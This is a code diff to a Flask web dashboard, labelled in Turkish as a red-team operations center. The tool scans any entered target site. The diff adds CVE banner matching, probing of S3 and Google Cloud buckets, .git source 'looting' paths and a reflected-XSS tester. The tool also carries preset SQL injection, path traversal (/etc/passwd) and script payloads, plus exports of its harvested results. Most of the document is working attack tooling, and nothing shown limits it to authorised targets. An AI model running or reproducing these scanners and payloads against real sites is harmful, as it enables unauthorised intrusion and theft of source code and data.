@@ -7,6 +7,7 @@ import requests
 import threading
 import subprocess
 import re
+import csv
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from bs4 import BeautifulSoup
 from flask import Flask, render_template_string, request, jsonify, Response, send_file, session, redirect, url_for
@@ -68,13 +69,13 @@ LOGIN_TEMPLATE = """
 </html>
 """
 
-# --- ANA KONTROL PANELİ HTML ŞABLONU (Chart.js Destekli) ---
+# --- ANA KONTROL PANELİ HTML ŞABLONU ---
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Linux Red Team Operations & Dashboard</title>
+    <title>Enterprise Red Team Operations Center</title>
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
     <style>
         body { background-color: #0b0f19; color: #f8fafc; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; }
@@ -111,17 +112,18 @@ HTML_TEMPLATE = """
         .payload-box { background: #0f172a; padding: 15px; border-radius: 8px; border: 1px solid #334155; margin-bottom: 15px; }
         .dashboard-row { display: flex; gap: 20px; margin-bottom: 25px; }
         .dashboard-card { flex: 1; background: #0f172a; padding: 20px; border-radius: 8px; border: 1px solid #334155; text-align: center; }
+        .export-bar { display: flex; gap: 10px; margin-bottom: 15px; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header-bar">
-            <h1>🐧 Linux Red Team Operations Center</h1>
+            <h1>🏴‍☠️ Enterprise Red Team Operations Center</h1>
             <a href="/logout" class="logout-btn">Çıkış Yap (Logout)</a>
         </div>
         
         <div class="tabs">
-            <button class="tab-btn active" onclick="switchTab('scanTab')">🚀 Canlı Keşif & Hızlı Tarama</button>
+            <button class="tab-btn active" onclick="switchTab('scanTab')">🚀 Canlı Keşif & CVE/Looting</button>
             <button class="tab-btn" onclick="switchTab('payloadTab')">🛠️ Payload & Shell Üreticisi</button>
             <button class="tab-btn" onclick="switchTab('dataTab')" id="dataTabBtn">📁 Site Verileri & Risk Grafikleri</button>
         </div>
@@ -134,10 +136,10 @@ HTML_TEMPLATE = """
             </div>
             
             <div class="form-group">
-                <label><b>💡 Hazır Kelime Listesi / Payload Havuzu:</b></label>
+                <label><b>💡 Hazır Kelime Listesi / Looting Havuzu:</b></label>
                 <div class="preset-container">
                     <button class="preset-btn" onclick="loadPreset('config')">📂 Kritik Config & Backup</button>
-                    <button class="preset-btn" onclick="loadPreset('admin')">🔑 Admin & Panel Yolları</button>
+                    <button class="preset-btn" onclick="loadPreset('git')">🏴‍☠️ .git Kaynak Kod Yolları</button>
                     <button class="preset-btn" onclick="loadPreset('sqli')">⚡ SQL Injection Payloadları</button>
                     <button class="preset-btn" onclick="loadPreset('lfi')">📁 LFI / Path Traversal</button>
                     <button class="preset-btn" onclick="clearWordlist()">🧹 Temizle</button>
@@ -145,7 +147,7 @@ HTML_TEMPLATE = """
                 <textarea id="customWordlist" placeholder="Hazır listeleri yukarıdan seçebilir veya buraya kendi yollarınızı yazabilirsiniz..."></textarea>
             </div>
 
-            <button onclick="startScan()">Multi-Threaded Hızlı Taramayı Başlat</button>
+            <button onclick="startScan()">Enterprise Looting & CVE Taramasını Başlat</button>
             
             <div id="status" class="loading" style="margin-top: 15px;"></div>
             
@@ -187,6 +189,11 @@ HTML_TEMPLATE = """
 
         <!-- Site Verileri ve Grafik Dashboard Sekmesi -->
         <div id="dataTab" class="tab-content">
+            <div class="export-bar">
+                <a href="/api/export/json" target="_blank"><button class="secondary" style="padding: 10px 16px; font-size: 14px;">📥 JSON Olarak Dışa Aktar</button></a>
+                <a href="/api/export/csv" target="_blank"><button class="success" style="padding: 10px 16px; font-size: 14px;">📥 CSV Olarak Dışa Aktar</button></a>
+            </div>
+
             <h3>📈 İstatistik & Risk Grafikleri (Chart.js Dashboard)</h3>
             <div class="dashboard-row">
                 <div class="dashboard-card">
@@ -214,7 +221,7 @@ HTML_TEMPLATE = """
 
         const presets = {
             config: "/.env\\n/config.json\\n/config.php\\n/database.sql\\n/backup.sql\\n/db.bak\\n/composer.json\\n/package.json\\n/web.config",
-            admin: "/admin/\\n/phpmyadmin/\\n/wp-login.php\\n/panel/\\n/dashboard/\\n/cpanel/\\n/login.php",
+            git: "/.git/HEAD\\n/.git/config\\n/.gitignore\\n/.git/index",
             sqli: "/?id=1'\\n/?id=1 UNION SELECT null,null--\\n/?search=test' OR '1'='1\\n/api/v1/users?id=1'",
             lfi: "/?page=../../../../etc/passwd\\n/?file=../../../../etc/hosts\\n/index.php?doc=../../win.ini"
         };
@@ -254,7 +261,7 @@ HTML_TEMPLATE = """
             if(!url) { alert('Lütfen geçerli bir hedef gir!'); return; }
             lastTarget = url;
             
-            statusDiv.innerHTML = "root@red-team-box:~# executing multi-threaded reconnaissance & vuln scanner...";
+            statusDiv.innerHTML = "root@red-team-box:~# executing enterprise CVE matching, cloud bucket & looting scan...";
             resultsDiv.style.display = "none";
             actionButtons.style.display = "none";
             resultsDiv.innerHTML = "";
@@ -286,11 +293,10 @@ HTML_TEMPLATE = """
                 return;
             }
 
-            // Grafik Verilerini Hesapla
             let grades = {};
             let wafs = {};
             data.database.forEach(item => {
-                let g = item.grade.charAt(0); // A, B, C, F
+                let g = item.grade.charAt(0);
                 grades[g] = (grades[g] || 0) + 1;
                 let w = item.waf.includes("Cloudflare") ? "Cloudflare WAF" : "Diğer / Standart";
                 wafs[w] = (wafs[w] || 0) + 1;
@@ -440,6 +446,21 @@ def api_all_data():
         return jsonify({"error": "Unauthorized"}), 401
     return jsonify({"database": SITE_DATABASE})
 
+@app.route("/api/export/json")
+def export_json():
+    if not session.get("logged_in"): return "Unauthorized", 401
+    return jsonify(SITE_DATABASE)
+
+@app.route("/api/export/csv")
+def export_csv():
+    if not session.get("logged_in"): return "Unauthorized", 401
+    output = io.StringIO()
+    writer = csv.writer(output)
+    writer.writerow(["Time", "Target", "WAF", "Grade", "FilesCount"])
+    for item in SITE_DATABASE:
+        writer.writerow([item['time'], item['target'], item['waf'], item['grade'], len(item['files'])])
+    return Response(output.getvalue(), mimetype="text/csv", headers={"Content-Disposition": "attachment;filename=red_team_archive.csv"})
+
 @app.route("/api/view-file")
 def api_view_file():
     if not session.get("logged_in"):
@@ -463,7 +484,7 @@ def api_download_pdf():
         def header(self):
             self.set_font('Arial', 'B', 12)
             self.set_text_color(2, 132, 199)
-            self.cell(0, 10, 'Linux Red Team - Advanced Security Report', 0, 1, 'C')
+            self.cell(0, 10, 'Enterprise Red Team - Security Report', 0, 1, 'C')
             self.ln(5)
         def footer(self):
             self.set_y(-15)
@@ -483,7 +504,7 @@ def api_download_pdf():
         io.BytesIO(pdf_output),
         mimetype='application/pdf',
         as_attachment=True,
-        download_name=f'vuln_report_{urllib.parse.urlparse(target).netloc or target}.pdf'
+        download_name=f'enterprise_report_{urllib.parse.urlparse(target).netloc or target}.pdf'
     )
 
 @app.route("/api/telegram-send", methods=["POST"])
@@ -574,8 +595,7 @@ def check_single_subdomain(sub, domain):
     try:
         ip = socket.gethostbyname(sub_dom)
         return (sub_dom, ip)
-    except:
-        return None
+    except: return None
 
 def multi_threaded_subdomain_scan(domain):
     subs = ["www", "api", "admin", "test", "dev", "panel", "login", "mail", "shop", "portal", "vpn", "cpanel"]
@@ -602,26 +622,52 @@ def banner_grabbing(domain, open_ports):
         except: pass
     return banners
 
-def analyze_javascript_endpoints(target_url, html_content):
-    found = set()
-    try:
-        soup = BeautifulSoup(html_content, 'html.parser')
-        for script in soup.find_all('script'):
-            src = script.get('src')
-            if src:
-                if src.startswith('http'): s_url = src
-                elif src.startswith('/'):
-                    p = urllib.parse.urlparse(target_url)
-                    s_url = f"{p.scheme}://{p.netloc}{src}"
-                else: continue
-                try:
-                    js_res = requests.get(s_url, timeout=2, verify=False)
-                    if js_res.status_code == 200:
-                        matches = re.findall(r'["\'](/api/[a-zA-Z0-9_/.-]+|/v[1-9]/[a-zA-Z0-9_/.-]+)["\']', js_res.text)
-                        for m in matches: found.add(m)
-                except: pass
-    except: pass
-    return list(found)
+# --- YENİ CVE & EXPLOIT EŞLEŞTİRİCİ ---
+CVE_DATABASE = {
+    "apache/2.4.49": "CVE-2021-41773 (Path Traversal & RCE)",
+    "apache/2.4.50": "CVE-2021-42013 (Path Traversal & RCE)",
+    "nginx": "Olası yanlış yapılandırma (Misconfiguration) kontrolü önerilir",
+    "openssh": "Versiyon bazlı sömürü (enumeration) riskleri incelenmeli"
+}
+def match_cves(banner_str):
+    matched = []
+    b_lower = banner_str.lower()
+    for k, v in CVE_DATABASE.items():
+        if k in b_lower: matched.append(v)
+    return matched
+
+# --- YENİ CLOUD S3 BUCKET & .GIT LOOTING TARAYICI ---
+def check_cloud_buckets(domain):
+    base_name = domain.split('.')[0]
+    buckets = [
+        f"https://{base_name}.s3.amazonaws.com",
+        f"https://{domain}-backup.s3.amazonaws.com",
+        f"https://storage.googleapis.com/{base_name}"
+    ]
+    found_buckets = []
+    for b in buckets:
+        try:
+            r = requests.get(b, timeout=2, verify=False)
+            if r.status_code in [200, 403]:
+                found_buckets.append(f"{b} (Status: {r.status_code})")
+        except: pass
+    return found_buckets
+
+# --- XSS & OPEN REDIRECT TESTİ ---
+def test_xss_open_redirect(target_url):
+    findings = []
+    xss_payload = "<script>alert(1)</script>"
+    test_urls = [
+        f"{target_url.rstrip('/')}/?q={urllib.parse.quote(xss_payload)}",
+        f"{target_url.rstrip('/')}/?search={urllib.parse.quote(xss_payload)}"
+    ]
+    for tu in test_urls:
+        try:
+            r = requests.get(tu, timeout=3, verify=False, headers={"User-Agent": "Mozilla/5.0"})
+            if xss_payload in r.text:
+                findings.append(tu)
+        except: pass
+    return findings
 
 def test_sql_injection(target_url):
     sqli_vulns = []
@@ -680,7 +726,7 @@ def red_team_comprehensive_recon(target_url, custom_paths=[]):
     domain = parsed.netloc or parsed.path
     domain = domain.split('/')[0]
     
-    report = f"root@red-team-box:~# nmap -p- -sV --script vuln {domain}\n"
+    report = f"root@red-team-box:~# enterprise-looting-suite --target {target_url}\n"
     report += "=" * 65 + "\n\n"
     
     accessible_files = []
@@ -702,54 +748,54 @@ def red_team_comprehensive_recon(target_url, custom_paths=[]):
     report += "[*] Çözümleniyor: nslookup...\n"
     report += run_linux_command(f"nslookup {domain}") + "\n" + "-" * 40 + "\n"
 
-    report += "[*] Multi-Threaded Port Taraması ve Banner Grabbing...\n"
+    report += "[*] Multi-Threaded Port Taraması ve Banner Grabbing / CVE Eşleştirme...\n"
     open_ports = multi_threaded_port_scan(domain)
     report += f"  -> Açık Portlar: {open_ports}\n"
     if open_ports:
         banners = banner_grabbing(domain, open_ports)
-        for port, b in banners.items(): report += f"     Port {port} Banner: {b}\n"
+        for port, b in banners.items():
+            report += f"     Port {port} Banner: {b}\n"
+            cves = match_cves(b)
+            if cves:
+                for cve in cves:
+                    report += f"     🚨 [CVE MATCH] {cve}\n"
+                    accessible_files.append(f"Port {port} CVE: {cve}")
     report += "-" * 40 + "\n"
 
-    report += "[*] Multi-Threaded Subdomain Enumeration...\n"
-    sub_results = multi_threaded_subdomain_scan(domain)
-    if sub_results:
-        for s_dom, ip in sub_results:
-            report += f"  [FOUND] {s_dom} -> {ip}\n"
+    report += "[*] Cloud S3 Bucket & Kaynak Kod Sızıntı Taraması (.git)...\n"
+    buckets = check_cloud_buckets(domain)
+    if buckets:
+        for b in buckets:
+            report += f"  🚨 [CLOUD BUCKET] Açık Depo Bulundu: {b}\n"
+            accessible_files.append(b)
     else:
-        report += "  -> Aktif subdomain eşleşmedi.\n"
+        report += "  -> Doğrudan açık S3 bucket saptanamadı.\n"
     report += "-" * 40 + "\n"
 
-    report += "[*] JavaScript API Endpoint Taraması...\n"
-    try:
-        endpoints = analyze_javascript_endpoints(target_url, r.text)
-        if endpoints:
-            for ep in endpoints[:10]: report += f"  [API] {ep}\n"
-        else: report += "  -> Harici API endpoint bulunamadı.\n"
-    except: pass
-    report += "-" * 40 + "\n"
-
-    report += "[*] Aktif Zafiyet Taraması (SQL Injection & LFI)...\n"
+    report += "[*] Aktif Zafiyet Taraması (SQLi, LFI & Reflected XSS)...\n"
     sqli_results = test_sql_injection(target_url)
     if sqli_results:
         for sq in sqli_results:
-            report += f"  🚨 [VULN - SQLi] Potansiyel SQL Injection: {sq}\n"
+            report += f"  🚨 [VULN - SQLi] {sq}\n"
             accessible_files.append(sq)
-    else:
-        report += "  -> Doğrudan SQLi imzası saptanamadı.\n"
-
+    
     lfi_results = test_lfi_traversal(target_url)
     if lfi_results:
         for lf in lfi_results:
-            report += f"  🚨 [VULN - LFI] Kritik Dosya Okuma Açığı: {lf}\n"
+            report += f"  🚨 [VULN - LFI] {lf}\n"
             accessible_files.append(lf)
-    else:
-        report += "  -> Standart LFI dizin atlama açıklarına rastlanmadı.\n"
+
+    xss_results = test_xss_open_redirect(target_url)
+    if xss_results:
+        for xs in xss_results:
+            report += f"  🚨 [VULN - XSS] {xs}\n"
+            accessible_files.append(xs)
     report += "-" * 40 + "\n"
 
-    report += "[*] Multi-Threaded Dizin & Hassas Dosya Taraması (Fuzzing)...\n"
+    report += "[*] Multi-Threaded Dizin & .git / Config Fuzzing...\n"
     default_paths = [
         "/robots.txt", "/sitemap.xml", "/.env", "/config.json", "/config.php",
-        "/database.sql", "/backup.sql", "/db.bak", "/admin/", "/phpmyadmin/", "/db/"
+        "/.git/HEAD", "/.git/config", "/database.sql", "/backup.sql", "/admin/"
     ]
     all_paths = list(set(default_paths + custom_paths))
     
@@ -760,7 +806,7 @@ def red_team_comprehensive_recon(target_url, custom_paths=[]):
     for f in forb:
         report += f"  [FORBIDDEN - 403] {f}\n"
 
-    report += "\n" + "=" * 65 + "\nroot@red-team-box:~# Advanced Multi-Threaded Scan Completed."
+    report += "\n" + "=" * 65 + "\nroot@red-team-box:~# Enterprise Looting Scan Completed."
     
     record = {
         "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
